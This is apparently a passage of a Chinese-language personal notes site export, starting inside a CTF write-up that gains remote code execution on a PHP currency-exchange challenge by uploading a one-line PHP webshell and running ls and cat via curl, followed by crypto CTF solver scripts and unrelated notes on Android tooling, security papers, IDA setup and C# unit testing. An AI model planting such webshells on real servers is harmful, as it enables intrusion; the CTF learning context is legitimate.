$htmlContent .= \u0026#34;\u0026lt;p\u0026gt;{$amount} TWD = {$convertedAmount} {$isoName}\u0026lt;/p\u0026gt;\u0026#34;; $htmlContent .= \u0026#34;\u0026lt;a href=\u0026#39;/\u0026#39;\u0026gt;Back to Home\u0026lt;/a\u0026gt;\u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt;\u0026#34;; $filePath = \u0026#34;upload/\u0026#34; . md5(uniqid()) . \u0026#34;.\u0026#34; . $isoName; file_put_contents($filePath, $htmlContent); $resultLink = \u0026#34;\u0026lt;a href=\u0026#39;\u0026#34; . $filePath . \u0026#34;\u0026#39;\u0026gt; 👁️ exchange result\u0026lt;/a\u0026gt;\u0026#34;; } ?\u0026gt; 前一段所說的功能就是這一段在做的事情，而從docker後台也可以看到一樣的狀況 在docker中的/upload/就會存成這樣的內容 所以是不是我們可以填入最基本的webshell後，當我們query這個file時就自動跑起來\n遭遇的困難 如果只是利用剛剛的狀態直接寫\u0026lt;?php system($_GET['sh']); ?\u0026gt;，會不成功，原因是雖然後端還是儲存成一個看起來像webshell的內容但是，送到前端被render後會被當作一般的comment，這也是我一開始卡的地方 How to solve? 可以觀察前面的dockerfile，倒數第二行的\nAddType application/x-httpd-php .php .Php .pHp .phP .pHP .PHp .PHP 根據chatgpt: 在Apache的配置文件 /etc/apache2/apache2.conf 中添加 AddType application/x-httpd-php .php .Php .pHp .phP .pHP .PHp .PHP 的意思是告訴Apache服務器將以 .php, .Php, .pHp, .phP, .pHP, .PHp, .PHP 結尾的文件視為PHP腳本文件進行解析和執行。這樣做可以確保Apache在收到這些文件請求時，將它們交給PHP解釋器處理，而不是簡單地將它們作為靜態文件發送給客戶端。\n(也就是說如果作者沒有加上這一段的話就不用玩了，應該ㄅ\u0026hellip;)\n所以我們要做的就很簡單了,看哪一個國家的縮寫是php相關的，只要選取該國家，後端就會把檔案取名成.PHP，翻了一下currency.php發現是==菲律賓==，所以只要選取菲律賓，並且用最簡單的php websehll就可以達到RCE 成功RCE Payload:\nhttp://localhost:33000/upload/d0a101da1484e8905de9fa45ed320d72.PHP?sh=ls Exploit - Upload Webshell # Payload:\n$ curl \u0026#34;http://localhost:33000/upload/d0a101da1484e8905de9fa45ed320d72.PHP?sh=ls%20/\u0026#34; \u0026lt;html\u0026gt;\u0026lt;body\u0026gt;\u0026lt;h1\u0026gt; Exchange result \u0026lt;/h1\u0026gt;\u0026lt;p\u0026gt;bin boot dev etc flag-lMXptmyC home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var $ curl \u0026#34;http://localhost:33000/upload/d0a101da1484e8905de9fa45ed320d72.PHP?sh=cat%20/flag-lMXptmyC\u0026#34; \u0026lt;html\u0026gt;\u0026lt;body\u0026gt;\u0026lt;h1\u0026gt; Exchange result \u0026lt;/h1\u0026gt;\u0026lt;p\u0026gt;TSCCTF{FAKEFLAG} TWD = TSCCTF{FAKEFLAG} PHP\u0026lt;/p\u0026gt;\u0026lt;a href=\u0026#39;/\u0026#39;\u0026gt;Back to Home\u0026lt;/a\u0026gt;\u0026lt;/body\u0026gt;\u0026lt;/html\u0026gt;% Crypto # CCcollision # Source Code # :::spoiler\nfrom hashlib import md5 from string import ascii_lowercase, digits from random import choice from secret import FLAG def get_random_string(length): return \u0026#34;\u0026#34;.join([choice(ascii_lowercase + digits) for _ in range(length)]) prefix = get_random_string(5) hashed = md5(get_random_string(30).encode()).hexdigest() print(\u0026#34;here is your prefix: \u0026#34; + prefix) print(\u0026#34;your hash result must end with: \u0026#34; + hashed[-6:]) user_input = input(\u0026#34;Enter the string that you want to hash: \u0026#34;) user_hash = md5(user_input.encode()).hexdigest() if user_input[:5] == prefix and user_hash[-6:] == hashed[-6:]: print(FLAG) :::\nExploit # 就是一般常見的pow要算的collision\nfrom pwn import * from hashlib import md5 import os from string import ascii_lowercase, digits from random import choice r = remote(\u0026#39;172.31.200.2\u0026#39;, 40004) def get_random_string(length): return \u0026#34;\u0026#34;.join([choice(ascii_lowercase + digits) for _ in range(length)]) print(r.recvuntil(b\u0026#39;here is your prefix: \u0026#39;)) prefix = r.recvline()[:-1] print(r.recvuntil(b\u0026#39;your hash result must end with: \u0026#39;)) ended = r.recvline()[:-1].decode() log.info(f\u0026#34;{prefix=}\\n{ended=}\u0026#34;) while True: ans = prefix + get_random_string(8).encode() user_hash = md5(ans).hexdigest() # print(user_hash) if ans[:5] == prefix and user_hash[-6:] == ended[-6:]: log.success(\u0026#34;Find Collision~~~\u0026#34;) r.sendlineafter(b\u0026#39;Enter the string that you want to hash: \u0026#39;, ans) break print(r.recvline()) r.interactive() Flag: TSC{2a92efd3d9886caa0bc437f236b5b695c54f43dc9bdb7eec0a9af88f1d1e0bee}\nEncoded not Encrypted # Source Code # :::spoiler\nfrom random import choice, randint from string import ascii_uppercase from secret import FLAG words = open(\u0026#34;./Crypto/Encode not Encrypt/fasttrack.txt\u0026#34;).read().splitlines() selected = [choice(words) for _ in range(100)] assert all(word in words for word in selected) ans = \u0026#34; \u0026#34;.join(selected) def a(s): return \u0026#34;\u0026#34;.join(hex(ord(c))[2:] for c in s) b_chars = \u0026#39;zyxwvutsrqponmlkjihgfedcba\u0026#39; def b(s): result = \u0026#34;\u0026#34; for c in s: binary = f\u0026#39;{ord(c):08b}\u0026#39; front, back = binary[:4], binary[4:] result += b_chars[int(front, 2)] + b_chars[int(back, 2)] return result c_chars = \u0026#39;?#%=\u0026#39; def c(s): result = \u0026#34;\u0026#34; for c in s: binary = f\u0026#39;{ord(c):08b}\u0026#39; for i in range(0, 8, 2): result += c_chars[int(binary[i:i+2], 2)] return result def d(s): return \u0026#34;\u0026#34;.join(oct(ord(c))[2:] for c in s) func = {0: a, 1: b, 2: c, 3: d} encodeds = [] hint = \u0026#34;\u0026#34; for word in selected: num = randint(0, 3) encodeds.append(func[num](word)) for bit in f\u0026#39;{num:02b}\u0026#39;: ch = choice(ascii_uppercase) hint += ch if bit == \u0026#39;1\u0026#39; else ch.lower() print(selected) print(\u0026#34; \u0026#34;.join(encodeds)) print(hint) user_input = input(\u0026#34;Enter the answer: \u0026#34;) if user_input == ans: print(FLAG) :::\nExploit # 這一題作者有放水，因為其實在轉換八進制的地方可以很難，撇除掉這個部分其實用chatGPT幫忙生一下code再local debug一下，應該不用半小時，source code中簡單的流程就是，他會從wordlist中抽選100個words，然後隨機給不同的encode方式，包含\n轉換成hex 依照字元的low / high bytes做到scramble 和上一個大同小異，依照每兩個bits做到scramble 轉換成八進制 作者有給hint，我們可以根據hint知道他是用哪一個方式encode，而最難的地方是八進制，因為不同的printable char會決定轉換後是三個char還是兩個char，假設原本的plaintext是==Summer2011==，這種同時包含數字和英文，encode完會變成==12316515515514516262606161==，但是其中英文的部分他是每三個string構成，而數字的部分就是每兩個string構成，如果只是知道他用八進制的方式encode，應該沒有辦法解決這樣的狀況，目前也還沒想到相對應的解法\nfrom pwn import * import string r = remote(\u0026#39;172.31.200.2\u0026#39;, 42816) encoded = r.recvline()[:-1].decode().split(\u0026#39; \u0026#39;) hint = r.recvline()[:-1].decode() # encoded = \u0026#34;vysusvsutmtlwxwzwyws #%#?#%?##=#?#%?##%?%#%?##=?=#%## #=?=#=??#=?%#%%##%=%#%#=?=?%?=???=?#?=?= ?=?#?=?#?=?#?=?#?=?#?=?# #=?=#%?##=?=#%?# swtusxsttusx tntusvtmtutqtl 146151162145 70617373 tytvtmtqtltqswsvtysvtksx 141144155151156163 77696e74657232303132 swtutwsxtusv 6d6f6e6b6579 70726976617465 163145162166145162 12316515515514516262606165 ustutntwtktmtuwywxww swsutmtmtusxwxwzwzwr ustqtlsvtusxwxwzwywu swtutwsusxtqsvsq swtltkss 57656c636f6d6531323132 swsutmtmtusxwxwzwzwr #=?=#%###%?=#=?%#%###=#??%?# 163161154 uzvzwuwusswzsxtvxy 146151162145 61646d696e61646d696e ##??#????=##?=###=#=?=??#=?%#%#??%?# 53756d6d657232303131 74657374 #=#?#%###=?=#=#??%=##=?=#=?##%=??=?= 7374617277617273 73716c70617373 ##?=#=###%=##%=##%###=?%?=?%?=???=?#?=?= 61646d696e69737461746f72 #%#=#%==#%?##=#? #%#?#=?%#%?##%#=#%==#%=% swsutmtmtusxwxwzwywz tysusvsutmtlwxwzwywu ###=#%%##%=%#=#?#%###=?%?=?%?=???=?#?=#% sutltotltksstl 163157155145144141171 155157156153145171 #%?=#%==#%=##=??#%?##%=%#=%#?=?#?%?# #=?##=#=#%###=?%#=#?#=%# 313233343536 syty 6561727468 svtuswsvxmswsytnww twtrtytltstu 163145143162145164616263 #=?=#=###%=##%=##%###=?%?=?%?=???=?#?=?= 6e6574776f726b73 504073737730726421 141144155151156163 123161154163145162166145162 #=?=#=###%=##%=##%###=?%?=?%?=???=?#?=## uzvzswswsswzsxtvxy 144162141147157156 uwsutmtmtusxwxwzwyws 6d6f6e6b6579 ##??#???#=?=#=?=#=#=#%==#=?%#%#??%?# 504035357730726421 #=#?#%###=?=#=#??%=##=?=#=?##%=??=?= 163145143162145164616263 646576646576 73656372657421 twtktmsztytlsqwyxy 57696e74657232303133 ustqtlsvtusxwxwzwywy wqwu 6368616e6765 143157155160141156171616263 146151162145 163157155145144141171 tltusvsstksxtotqtlts swsytnswtusxsttusxwxwzwzwu 7365637265743121 170160 537072696e6732303134 6e6574776f726b696e67 #%=%#=#? 141144155151156 7870 70617373776f7264313233 #%?%#%%##=?%#%#? 12010065651676016214441 16316115462606071 #=?=#%###%?=#=###=?%#%%##=#?#=%# ?=%#?=## #=?=#=%##=?=#%?##%#?#%=##%%##%=% #=#?#%###=?=#=#?#=#?#%###=?=#=#? 74657374696e67313233 #%?##%#?#%=##%%##%=% 737072696e6732303137 143150141156147145 12316515515514516262606161 tysusvsutmtlwxwzwyws\u0026#34;.split(\u0026#39; \u0026#39;) # hint = \u0026#39;rETwKtXdNrgIdKGNvhuXWXqtkOpcfzTEKKvQcNzIsPxLgyvQMxOWnDZOunIyujxcNnbsvbOqwoYmUtlWlBUfyGDLXIOoVcyqyMkcjQbKBNUtabauLFHZLqaNOSvVvrFhbkWdHWsdrjkAcxvViRfkGGLTTFkShPujVXgunhBmPCvmugHeTVDXKhVwHvPuftKdmlZJIBrI\u0026#39; ascii_lower = string.ascii_lowercase ascii_higher = string.ascii_uppercase def dec_a(s): return bytes.fromhex(s).decode(\u0026#39;utf-8\u0026#39;) b_chars = \u0026#39;zyxwvutsrqponmlkjihgfedcba\u0026#39; def dec_b(s): res = \u0026#39;\u0026#39; for i in range(0, len(s), 2): front = b_chars.find(s[i]) back = b_chars.find(s[i+1]) bin = f\u0026#39;{front:04b}\u0026#39; + f\u0026#39;{back:04b}\u0026#39; res += chr(int(bin, 2)) return res c_chars = \u0026#39;?#%=\u0026#39; def dec_c(s): result = \u0026#34;\u0026#34; for i in range(0, len(s), 4): binary_chunk = \u0026#34;\u0026#34; for j in range(4): binary_chunk += f\u0026#39;{c_chars.index(s[i + j]):02b}\u0026#39; result += chr(int(binary_chunk, 2)) return result # def dec_d(s): # s = [s[i:i+2] for i in range(0, len(s), 2)] # return \u0026#34;\u0026#34;.join(chr(int(i, 8)) for i in s) def decode_octal(encoded_str): octal_chunks = [encoded_str[i:i+3] for i in range(0, len(encoded_str), 3)] decoded_str = \u0026#34;\u0026#34;.join(chr(int(chunk, 8)) for chunk in octal_chunks) return decoded_str answer = b\u0026#34;\u0026#34; for i in range(len(encoded)): if hint[i*2] in ascii_lower and hint[i*2+1] in ascii_lower: answer += dec_a(encoded[i]).encode() + b\u0026#39; \u0026#39; elif hint[i*2] in ascii_lower and hint[i*2+1] in ascii_higher: answer += dec_b(encoded[i]).encode() + b\u0026#39; \u0026#39; elif hint[i*2] in ascii_higher and hint[i*2+1] in ascii_lower: answer += dec_c(encoded[i]).encode() + b\u0026#39; \u0026#39; elif hint[i*2] in ascii_higher and hint[i*2+1] in ascii_higher: answer += decode_octal(encoded[i]).encode() + b\u0026#39; \u0026#39; print(answer) r.sendlineafter(b\u0026#39;Enter the answer: \u0026#39;, answer[:-1]) r.interactive() Baby staRburSt streAm # Source Code # :::spoiler\nprint( \u0026#34;\u0026#34;\u0026#34; /\u0026gt;_________________________________ [########[]_________________________________\u0026gt; \\\u0026gt; Sword Art Offline \u0026#34;\u0026#34;\u0026#34; ) from Crypto.Util.number import * from random import random from time import sleep from secret import FLAG flag = bytes_to_long(FLAG) p = getPrime(1024) q = getPrime(1024) n = p * q print(f\u0026#39;{n = }\u0026#39;) assert 2*n \u0026gt; flag \u0026gt; 0 def starburst(x: int): return (x * 0x48763 + 0x74) % n def isBurst() -\u0026gt; bool: return True sleep(10) for i in range(16): flag = starburst(starburst(flag)) if isBurst(): print(pow(flag, 0x487, n)) :::\nRecon # 這一題是賽後解，也是看了@ywc大1的WP，其實很簡單，就是一個簡單的Related Message Attack，題目甚至也沒什麼變，\nExploit # Reference # ywc大大的WP\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n"},{"id":493,"href":"/problem-solutions/uiautomatorviewer-%E5%B8%B8%E8%A6%8B%E5%95%8F%E9%A1%8C%E6%95%B4%E7%90%86/","title":"UiAutomatorViewer 常見問題整理","section":"Problem Solutions","content":" UiAutomatorViewer 常見問題整理 # Java版本不相容 # 參考來源1: Setting up Appium configuration on windows / Mac 參考來源2: uiautomatorviewer閃退、提示Could not create the Java Virtual Machine等問題的處理\n如果電腦安裝的JAVA version不是JAVA 8的話，有極高的機率會出錯，但又不想要覆蓋掉自己原本安裝的latest version，那參考來源1這個forum可以滿足這樣的事情\n下載JAVA 8並安裝 - 參考(超詳細）2022年最新版java 8（jdk1.8u321）安裝教程 Official Link: https://www.oracle.com/java/technologies/downloads/#java8-windows 下載完UiAutomatorViewer之後直接改內部的bat file Open uiautomatorviewer.bat with editor by the path - %USERPROFILE%\\AppData\\Local\\Android\\Sdk\\tools\\bin\\uiautomatorviewer.bat 搜尋set java_exe=並且設定成comment，再更新如下 $ set java_exe=C:\\Program Files\\Java\\jdk-1.8\\bin\\java.exe Error while obtaining UI hierarchy XML file: com.android.ddmlib.SyncException: Remote object doesn\u0026rsquo;t exist! # 這個的解決方案有很多，我是在使用Spotify的時候出現這個問題，解決的方案是第一個 參考來源1: CSDN - adb常用命令 參考來源2: cnblogs - 【Android】【問題解決記錄】Error obtaining UI hierarchy :Error while obtaining UI hierarchy XML file: com.android.ddmlib.SyncException: Remote object doesn\u0026rsquo;t exist! 參考來源3: StackOverflow - Error obtaining UI hierarchy Error while obtaining UI hierarchy XML file: com.android.ddmlib.SyncException: Remote object doesn\u0026rsquo;t exist 參考來源4: CSDN - Error while obtaining UI hierarchy XML file: com.android.ddmlib.SyncExceptio解決方法 參考來源5: uiautomatorviewer報錯：Remote object doesn‘t exist Error while obtaining UI hierarchy XML file\n方法一: 直接斷網再重新測試 方法二: 查看電腦的adb version和手機的sdk version有無符合 手機sdk版本: $ adb shell getprop ro.build.version.sdk 電腦adb版本: $ adb version 如果電腦的adb版本過高好像也會出錯，因此可以考慮降低版本 方法三: 重新啟動adb $ sudo adb kill-server $ sudo adb start-server 重啟手機 如果使用uiautomatorviewer的同時也有使用Appium，可以想辦法把Appium kill掉，好像會出現衝突之類的問題 打開手機開發者權限，將USB Debug按鈕重新啟動 "},{"id":494,"href":"/survey-papers/android-+-security/uncovering-intent-based-leak-of-sensitive-data-in-android-framework/","title":"Uncovering Intent based Leak of Sensitive Data in Android Framework","section":"Survey Papers","content":" Uncovering Intent based Leak of Sensitive Data in Android Framework # tags: Meeting Paper NTU # :::info Zhou, H., Luo, X., Wang, H., \u0026amp; Cai, H. (2022, November). Uncovering Intent based Leak of Sensitive Data in Android Framework. In Proceedings of the 2022 ACM SIGSAC Conference on Computer and Communications Security (pp. 3239-3252). :::\nBackground # :::spoiler [Android] Activity基本介紹\n什麼是Activity? Activity是App中，提供畫面的一個元件， 例如：使用Google地圖App時，顯示地圖的那個畫面。\n只有Activity可以顯示畫面嗎？ 不是，除了Activity以外還有其他元件可以顯示畫面， 例如：Dialog，但每一個App至少要有一個Activity，但這有個例外，如果這個App不提供介面的話也是可以不用有Activity的。\nActivity其他注意事項\n兩個Activity傳遞資訊是透過Intent Intent intent = new Intent(this, TwoActivity.class); startActivity(intent); Intent 能傳遞的資訊大小要小於512k 每一個Activity都要在AndroidManifest中聲明 \u0026lt;manifest ... \u0026gt; \u0026lt;application ... \u0026gt; \u0026lt;activity android:name=\u0026#34;.MainActivity\u0026#34; /\u0026gt; ... \u0026lt;/application ... \u0026gt; ... \u0026lt;/manifest \u0026gt; :::\n:::spoiler Android基本(2)-Intent基本觀念與使用釐清\n我們該如何從一個 activity 去啟動另外一個 activity，又或者我們要怎麼進行兩個 activity 間的資料通等等的問題，這時候最常見的方式就是使用我們今天的主角 Intent\n種類 # 下方名稱網路上對他們的名稱有些需的差異，在這邊以 android doc 上名稱為主。\n明確意圖(Explicit intents)：官方的說明有點冗長，講白一點就是在指定啟動元件的時候，我們直接使用名稱(完整的類別名稱)進行指定。 例如： Intent intent = new Intent(FirstActivity.this, SecondActivity.class); 隱含意圖(Implicit intents)：在宣告的時候不指定給特定的元件，而是針對功能、動作進行宣告，來讓定一個應用程式的元件進行處理。 例如：在APP中開啟網頁，系統發現手機上有chrome以及預設瀏覽器提供網頁瀏覽的功能，這時候便會跳出選單讓使用者選擇。 範例 # 明確意圖範例\nIntent intent = new Intent(FirstActivity.this, SecondActivity.class); startActivity(intent); 這邊我的例子是在兩個 activity 間的互動，service相關使用可以參考 google doc 中的範例。\n隱含意圖範例\nIntent intent = new Intent(); intent.setAction(Intent.ACTION_VIEW); intent.setData(Uri.parse(\u0026#34;https://google.com\u0026#34;)); startActivity(intent); 這邊這個例子是開啟網頁的使用，另外在 google doc 中的例子是發送電子郵件，也可以進行參考。 :::\n:::spoiler What is entity in android?\nfields and classes defined in Android framework :::\n:::spoiler What is field in Android?\nDocumentation # A Field provides information about, and dynamic access to, a single field of a class or an interface. The reflected field may be a class (static) field or an instance field.\nA Field permits widening conversions to occur during a get or set access operation, but throws an IllegalArgumentException if a narrowing conversion would occur.\n012-定義類別與建立物件 # 在類別中, 需使用成員變數 (Member Variable) 來描述類別的屬性, 在 Java語言中又稱其為類別的欄位 (Field)。 成員變數的宣告方式, 和前面所用的一般變數差不多, 例如我們的汽車類別要有記錄載油量、耗油率, 可寫成：\nclass Car{ double gas; //載油量 double eff; //耗油率 } :::\n:::spoiler what is a dex file?\nDalvik executable files are developer files affixed with the .dex extension, and these DEX files are used to initialize and execute applications developed for the Android mobile OS. The data stored in these DEX files includes compiled code that locates and initializes other program files of the associated application required to run the program. :::\nAndroid Framework # :::spoiler What is TTY Reference: What is TTY Day 12深入Docker Container內部(上)\nTTY的原意是\u0026quot;teletypewriter\u0026quot;（電傳打字機，早期用來操作並和大型電腦連線的終端機）\n在上古時代，一台電腦是要透過多用戶進行操作的，畢竟當時的電腦很貴，要操作的事情也很繁瑣，而多個用戶自然就需要多台打字機對著電腦進行輸入。\n而 tty 正是英文 Teletypewriter的縮寫，但其實在現代，終端機和打字機的界線已經模糊不清，可以想像，終端機就是 tty，反之亦然 :::\n:::spoiler com.android.server.telecom.TelecomServiceImpl\n... /** * @see android.telecom.TelecomManager#getCurrentTtyMode */ @Override public int getCurrentTtyMode(String callingPackage) { if (!canReadPhoneState(callingPackage, \u0026#34;getCurrentTtyMode\u0026#34;)) { return TelecomManager.TTY_MODE_OFF; } synchronized (mLock) { return mCallsManager.getCurrentTtyMode(); } } ... :::\n:::spoiler com.android.server.telecom.CallsManager\n... int getCurrentTtyMode() { return mTtyManager.getCurrentTtyMode(); } :::\n:::spoiler com.android.server.telecom.TtyManager\n... int getCurrentTtyMode() { return mCurrentTtyMode; } ... :::\n:::spoiler Android adb基本用法教學\nadb(Android Debug Bridge)指令是開發 Android 時常用到的工具，使用 adb 指令可對 android 裝置進行除錯、測試、檔案處理、安裝/移除 apk 等的操作 :::\n:::spoiler com.android.server.adb.AdbService\n@Override public FingerprintAndPairDevice[] getPairedDevices() { mContext.enforceCallingOrSelfPermission(android.Manifest.permission.MANAGE_DEBUGGING, null); if (mDebuggingManager == null) { return null; } Map\u0026lt;String, PairDevice\u0026gt; map = mDebuggingManager.getPairedDevices(); FingerprintAndPairDevice[] ret = new FingerprintAndPairDevice[map.size()]; int i = 0; for (Map.Entry\u0026lt;String, PairDevice\u0026gt; entry : map.entrySet()) { ret[i] = new FingerprintAndPairDevice(); ret[i].keyFingerprint = entry.getKey(); ret[i].device = entry.getValue(); i++; } return ret; } :::\n:::spoiler com.android.server.adb.AdbDebuggingManager\n/** * Returns the list of paired devices. */ public Map\u0026lt;String, PairDevice\u0026gt; getPairedDevices() { AdbKeyStore keystore = new AdbKeyStore(); return keystore.getPairedDevices(); } :::\n:::spoiler com.android.server.adb.AdbDebuggingManager.AdbKeyStore\nclass AdbKeyStore { ... public Map\u0026lt;String, PairDevice\u0026gt; getPairedDevices() { Map\u0026lt;String, PairDevice\u0026gt; pairedDevices = new HashMap\u0026lt;String, PairDevice\u0026gt;(); for (Map.Entry\u0026lt;String, Long\u0026gt; keyEntry : mKeyMap.entrySet()) { String fingerprints = getFingerprints(keyEntry.getKey()); String hostname = \u0026#34;nouser@nohostname\u0026#34;; String[] args = keyEntry.getKey().split(\u0026#34;\\\\s+\u0026#34;); if (args.length \u0026gt; 1) { hostname = args[1]; } PairDevice pairDevice = new PairDevice(); pairDevice.name = hostname; pairDevice.guid = fingerprints; pairDevice.connected = mWifiConnectedKeys.contains(keyEntry.getKey()); pairedDevices.put(keyEntry.getKey(), pairDevice); } return pairedDevices; } } :::\n:::spoiler What is a stock ROM? stock rom其實就有點像是廠商為特定商品出的ROM而且廠商不會對其有其他更改\nStock ROM: A Stock ROM/Firmware is an official software that is designed by the manufacturer for a particular device. A Truly Stock ROM is one type that does not undergo any cosmetic/functional changes in the code by hardware manufacturer. The \u0026ldquo;stock ROM\u0026rdquo; comes installed on the phone or tablet at the time of buying which is given by the device manufacturer. Stock Rom is one that doesn’t undergo any kind of modifications that is done in a custom Rom.\nCustom ROM: A “Custom Rom” is a software(OS) that is modified by user either to add, delete or Modify features or behavior which improves look and feel, design, themes, performance of OS for a particular device. Users including me love to install custom rom because they have extra features, better UI or performance compared to “Stock ROM”. :::\n"},{"id":495,"href":"/survey-papers/android-+-security/understanding-real-world-threats-to-deep-learning-models-in-android-apps/","title":"Understanding Real-world Threats to Deep Learning Models in Android Apps","section":"Survey Papers","content":" Understanding Real-world Threats to Deep Learning Models in Android Apps # tags: Meeting Paper NTU # :::info Deng, Z., Chen, K., Meng, G., Zhang, X., Xu, K., \u0026amp; Cheng, Y. (2022, November). Understanding real-world threats to deep learning models in android apps. In Proceedings of the 2022 ACM SIGSAC Conference on Computer and Communications Security (pp. 785-799). :::\nBackground # :::spoiler What is Adversarial Example? - 運用對抗例攻擊深度學習模型\n所謂對抗例，是一種刻意製造的、讓機器學習模型判斷錯誤的輸入資料。最早是 Szegedy et al（2013）發現對於用 ImageNet、AlexNet 等資料集訓練出來的影像辨識模型，常常只需要輸入端的微小的變動，就可以讓輸出結果有大幅度的改變。例如取一張卡車的照片，可以被模型正確辨識，但只要改變影像中的少數像素，就可以讓模型辨識錯誤，而且前後對影像的改變非常少，對肉眼而言根本分不出差異。 :::\n:::spoiler hook（钩子函数） 钩子函数是什么意思\n在Windows系統中一切皆消息，按鍵盤上的鍵，也是一個消息。Hook 的意思是鉤住，也就是在消息過去之前，先把消息鉤住，不讓其傳遞，使用戶可以優先處理。執行這種操作的函數也稱為鉤子函數。\nHook API讓應用程式乖乖轉彎，駭客也是這麼做 :::\n:::spoiler Remote Procedure Call (RPC) in Operating System\nRemote Procedure Call (RPC) is a powerful technique for constructing distributed, client-server based applications. It is based on extending the conventional local procedure calling so that the called procedure need not exist in the same address space as the calling procedure. The two processes may be on the same system, or they may be on different systems with a network connecting them.\n在王凡老師的OS中也有提到RPC(Ch.3 P3.54)\nRemote procedure call abstract procedure calls between processes on networked systems\n簡單來說，他可以執行遠端PC的某一個module或method，而這東西的好處是可以降低programmer學習IPC的障礙，因為這種方式更直觀，大概就像下圖一樣 :::\n:::spoiler What is Class Hierarchy Analysis?\nIt is a static (compile time) analysis that uses the class hierarchy to compute which method implementations can be invoked by objects of each class type. The left diagram above shows an example hierarchy of five classes where subclasses point to their parent class: D and E are subclasses of C while B and C are subclasses of A. :::\n8 種主流深度學習框架介紹 [Day 21] 媽! Keras 和 TensorFlow 在亂存模型啦! ( TFLite 輕量模型) :::spoiler What is OCR? - 文字辨識方法統整\nOCR 英文全稱是 Optical Character Recognition，中文叫做光學字元識別，目前是文字辨識的統稱，已不限於文檔或書本文字辨識，更包括辨識自然場景下的文字，又可以稱為 STR（Scene Text Recognition）。\n圖1 中有三個大分類，包含 Text detection, Text recognition, Text spotting，Text detection 主要是偵測文字在影像中的哪個位置，Text recognition 主要是將偵測後的結果拿來辨識是什麼文字，而 Text spotting 則是將 detection 和 recognition 整合到一個 End-to-End 的網路中來進行文字辨識。 :::\n互聯網行業中，常說的API和SDK是什麼？\nWhat is Tiny Encryption Algorithm(TEA)?\nWhat is MACE framework? - 小米AI推理框架MACE介绍\n:::spoiler What is a trusted execution environment (TEE)?\nA trusted execution environment (TEE) is an area on the main processor of a device that is separated from the system\u0026rsquo;s main operating system (OS). It ensures data is stored, processed and protected in a secure environment. TEEs provide protection for anything connected, such as a trusted application (TA), by enabling an isolated, cryptographic electronic structure and end-to-end security. This includes the execution of authenticated code, confidentiality, authenticity, privacy, system integrity and data access rights. :::\n:::spoiler What is Perturbation Budget? - From ChatGPT\n在深度學習安全領域，擾動預算指的是可以引入到輸入數據中的最大擾動或失真程度，而不會顯著影響深度學習模型的輸出或預測結果。\n擾動通常作為對抗攻擊的一部分引入，攻擊者試圖以某種方式操縱輸入數據，使模型出現誤分類或產生錯誤輸出。通過設置擾動預算，系統可以限制這些攻擊的影響，並提高其對抗攻擊的魯棒性。\n擾動預算的定義方式因應用和攻擊類型而異。例如，它可以用擾動向量的L2或L∞範數來衡量，分別代表原始輸入數據和擾動後數據之間的歐幾里得距離或最大絕對差值。\n總的來說，擾動預算是評估深度學習模型安全性和魯棒性的重要參數，特別是在安全性是重要關注點的應用中。 :::\n:::spoiler What is quantization? - 使用機器學習解決問題的五步驟 : 模型推論\nPruning 與 Quantization\n我們在這裡簡單說明 Pruning 與 Quantization 的概念，如果想更深入學習模型效能、速度與能耗的最佳化問題，可以參考 TensorFlow 的官方文件。\nPruning : 全名為 Weight Pruning，中文稱為「權重修剪」。透過觀察模型中哪些參數對於模型的預測過程較沒有影響，將這些參數移除，達到降低模型複雜度與運算量的目的。 Quantization : 中文稱為「量化」。模型中的參數如果是 32-bit 的浮點數，將其轉為 8-bit。透過簡化模型中參數的「精確程度」達到降低模型體積並提高運算速度的目的。 不管是 Pruning 或是 Quantization，都是希望夠在簡化模型複雜度、提升運算速度並降低能源與時間消耗的同時，保持模型原來的預測準確度。 :::\nWhat is transfer learning?\n"},{"id":496,"href":"/problem-solutions/unexpected-fatal-error-while-initializing-python-runtime_/","title":"Unexpected fatal error while initializing python runtime.","section":"Problem Solutions","content":" Unexpected fatal error while initializing python runtime. # Complete error message: Unexpected fatal error while initializing python runtime. Please run idapyswitch to confirm or change the used Python runtime\nSolution # IDA出错unexpected fatal error while intitailizing python runtime.\n只要在使用者變數增加PYTHON:C:\\Users\\berni\\anaconda3\\envs\\NTUCNS\\ 在增加環境變數C:\\Users\\berni\\anaconda3\\envs\\NTUCNS\\Lib Note: ==但這樣的情況會變成VSCode的terminal沒辦法使用conda的command，而一般的CMD或是WSL不受影響==\nIDA Pro 7.7 # IDA Pro 7.7\nOther Reference # IDA免安裝版沒有python執行功能 IDA7.0的脚本语言：idc和idapython\n"},{"id":497,"href":"/security/course/ntu-st/unit-test-practice/","title":"Unit Test Practice","section":"Securities","content":" Unit Test Practice # tags: NTU_ST Software Testing # :::spoiler Click to open TOC [TOC] :::\nInstall the environment # Install Visual Studio with .NET that we can use C# language to implement unit test properly. Create a project to test # Create a new project and choose C# as your language and named the project Bank. Rename Program.cs as BankAccount.cs and replace all content by the following code. using System; namespace BankAccountNS public class BankAccount { private readonly string m_customerName; private double m_balance; private BankAccount() { } public BankAccount(string customerName, double balance) { m_customerName = customerName; m_balance = balance; } public string CustomerName { get { return m_customerName; } } public double Balance { get { return m_balance; } } public void Debit(double amount) { if (amount \u0026gt; m_balance) { throw new ArgumentOutOfRangeException(\u0026#34;amount\u0026#34;); } if (amount \u0026lt; 0) { throw new ArgumentOutOfRangeException(\u0026#34;amount\u0026#34;); } m_balance += amount; // intentionally incorrect code } public void Credit(double amount) { if (amount \u0026lt; 0) { throw new ArgumentOutOfRangeException(\u0026#34;amount\u0026#34;); } m_balance += amount; } public static void Main() { BankAccount ba = new BankAccount(\u0026#34;Mr. Bryan Walton\u0026#34;, 11.99); ba.Credit(5.77); ba.Debit(11.22); Console.WriteLine(\u0026#34;Current balance is ${0}\u0026#34;, ba.Balance); } } } Build it by clicking Build Solution in Build menu. Create a unit test project # Create a new project at solution explorer and named it BankTests. The other part just maintain default setup. Select MSTest Test Project\u0026lt;-This is important. Add reference by selecting Add Reference at BankTests/Dependencies In the Reference Manager dialog box, expand Projects, select Solution, and then check the Bank item. Create the test class # Rename UnitTest1.cs to BankAccountTests.cs and replace the original code with the following section and add using statement at the top of the class file. using Microsoft.VisualStudio.TestTools.UnitTesting; namespace BankTests { [TestClass] public class BankAccountTests { [TestMethod] public void TestMethod1() { } } } BTW, the default class part can be ignored. Create the first test method # Replace the default class with the following code [TestMethod] public void Debit_WithValidAmount_UpdatesBalance() { // Arrange double beginningBalance = 11.99; double debitAmount = 4.55; double expected = 7.44; BankAccount 